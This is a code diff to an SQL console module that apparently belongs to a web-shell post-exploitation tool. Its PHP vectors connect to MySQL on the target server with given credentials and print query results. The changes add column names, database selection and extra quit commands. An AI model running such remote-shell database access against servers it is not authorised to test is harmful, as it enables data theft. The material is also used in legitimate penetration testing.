@@ -24,8 +24,12 @@ class Console(Module):
         self.register_vectors(
             [
                 PhpCode(
-                    """if($s=mysqli_connect('${host}','${user}','${passwd}')){$r=mysqli_query($s,'${query}');if($r){while($c=mysqli_fetch_row($r)){foreach($c as $key=>$value){echo $value.'${linsep}';}echo '${colsep}';}};mysqli_close($s);}echo '${errsep}'.@mysqli_connect_error().' '.@mysqli_error();""",
+                    """if($s=mysqli_connect('${host}','${user}','${passwd}')){$r=mysqli_query($s,'${query}');if($r){$f=mysqli_fetch_fields($r);foreach($f as $v){echo $v->name.'${linsep}';};echo '${colsep}';while($c=mysqli_fetch_row($r)){echo implode('${linsep}',$c);echo '${colsep}';}};mysqli_close($s);}echo '${errsep}'.@mysqli_connect_error().' '.@mysqli_error();""",
                     name='mysql',
+                ),
+                PhpCode(
+                    """if($s=mysqli_connect('${host}','${user}','${passwd}','${database}')){$r=mysqli_query($s,'${query}');if($r){$f=mysqli_fetch_fields($r);foreach($f as $v){echo $v->name.'${linsep}';};echo '${colsep}';while($c=mysqli_fetch_row($r)){echo implode('${linsep}',$c);echo '${colsep}';}};mysqli_close($s);}echo '${errsep}'.@mysqli_connect_error().' '.@mysqli_error();""",
+                    name='mysql_database',
                 ),
                 PhpCode(
                     """$r=mysqli_query('${query}');if($r){while($c=mysqli_fetch_row($r)){foreach($c as $key=>$value){echo $value.'${linsep}';}echo '${colsep}';}};mysqli_close();echo '${errsep}'.@mysqli_connect_error().' '.@mysqli_error();""",
@@ -49,9 +53,9 @@ class Console(Module):
         self.register_arguments([
             {'name': '-user', 'help': 'SQL username'},
             {'name': '-passwd', 'help': 'SQL password'},
-            {'name': '-host', 'help': 'Db host or host:port', 'nargs': '?', 'default': 'localhost'},
+            {'name': '-host', 'help': 'Db host (default: localhost)', 'nargs': '?', 'default': 'localhost'},
             {'name': '-dbms', 'help': 'Db type', 'choices': ('mysql', 'pgsql'), 'default': 'mysql'},
-            {'name': '-database', 'help': 'Database name (Only PostgreSQL)'},
+            {'name': '-database', 'help': 'Database name'},
             {'name': '-query', 'help': 'Execute a single query'},
             {'name': '-encoding', 'help': 'Db text encoding', 'default': 'utf-8'},
         ])
@@ -78,7 +82,6 @@ class Console(Module):
             result = str(result)
         except UnicodeError:
             result = str(result.decode(args.get('encoding')))
-        
         # If there is not errstr, something gone really bad (e.g. functions not callable)
         if errsep not in result:
             return {
@@ -106,7 +109,7 @@ class Console(Module):
         database = self.args.get('database')
 
         # Check if PostgreSQL and database is given
-        if vector == 'pgsql' and database:
+        if database:
             vector += '_database'
         else:
             # And by the user and password presence
@@ -131,7 +134,7 @@ class Console(Module):
             return result
 
         if result['result'][0]:
-            user = result['result'][0][0]
+            user = result['result'][1][0]
 
         # Console loop
         while True:
@@ -140,7 +143,7 @@ class Console(Module):
 
             if not query:
                 continue
-            if query == 'quit':
+            if query in ['quit','\q','exit']:
                 break
 
             self.args['query'] = query
